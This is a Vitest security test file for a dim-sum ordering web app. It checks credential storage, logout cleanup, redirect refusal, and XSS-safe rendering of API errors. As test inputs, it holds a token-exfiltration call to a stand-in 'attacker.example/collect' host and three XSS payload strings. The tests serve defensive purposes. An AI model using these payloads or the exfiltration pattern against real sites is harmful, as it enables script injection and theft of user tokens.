// @vitest-environment happy-dom
import React, { act } from 'react';
import { createRoot } from 'react-dom/client';
import { describe, it, expect, vi, afterEach } from 'vitest';
import { browserStorage, discardLegacyPrivateStorage } from '../browserStorage';
import { request } from '../../api/client';
import { request as secureRequest } from '../../api/secureClient';
import DataView from '../../components/ui/DataView';
globalThis.IS_REACT_ACT_ENVIRONMENT = true;
afterEach(() => { localStorage.clear(); sessionStorage.clear(); vi.unstubAllGlobals(); });
describe('storage and credential exposure', () => {
  it('keeps tokens and personal data out of permanent storage including Zustand copies', () => {
    for (const key of ['adminToken','dimsum_customer_token','admin-auth-store','customer-auth-store','dimsum_order_history','dimsum_customer_phone']) {
      browserStorage.setItem(key,'private');
      expect(localStorage.getItem(key)).toBeNull();
      expect(sessionStorage.getItem(key)).toBe('private');
    }
  });
  it('discards old local credentials instead of reviving them', () => {
    localStorage.setItem('adminToken','old-secret');
    discardLegacyPrivateStorage();
    expect(browserStorage.getItem('adminToken')).toBeNull();
    expect(localStorage.getItem('adminToken')).toBeNull();
  });
  it('clears customer personal data and duplicated state on logout', () => {
    for (const key of ['dimsum_customer_token','customer-auth-store','dimsum_order_history','dimsum_customer_phone']) browserStorage.setItem(key,'private');
    browserStorage.removeItem('dimsum_customer_token');
    for (const key of ['dimsum_customer_token','customer-auth-store','dimsum_order_history','dimsum_customer_phone']) expect(browserStorage.getItem(key)).toBeNull();
  });
  it.each([request, secureRequest])('does not send tokens to an external origin', async (send) => {
    browserStorage.setItem('dimsum_customer_token','secret');
    const fetchMock = vi.fn(); vi.stubGlobal('fetch',fetchMock);
    const res=await send('https://attacker.example/collect');
    expect(res.success).toBe(false); expect(fetchMock).not.toHaveBeenCalled();
  });
  it('refuses redirects on authenticated API requests', async () => {
    const fetchMock=vi.fn().mockResolvedValue(new Response('{}',{headers:{'Content-Type':'application/json'}}));
    vi.stubGlobal('fetch',fetchMock);
    await request('/api/products');
    expect(fetchMock.mock.calls[0][1].redirect).toBe('error');
  });
});
describe('XSS in API error rendering', () => {
  it.each(['<img src=x onerror="window.pwned=1">','<svg onload="window.pwned=1">','<script>window.pwned=1</script>'])('renders payload as text: %s', async (payload) => {
    const container=document.createElement('div'); const root=createRoot(container);
    await act(async()=>root.render(<DataView error={payload}/>));
    expect(container.textContent).toContain(payload);
    expect(container.querySelector('script,img,[onload],[onerror]')).toBeNull();
    expect(window.pwned).toBeUndefined();
    await act(async()=>root.unmount());
  });
});
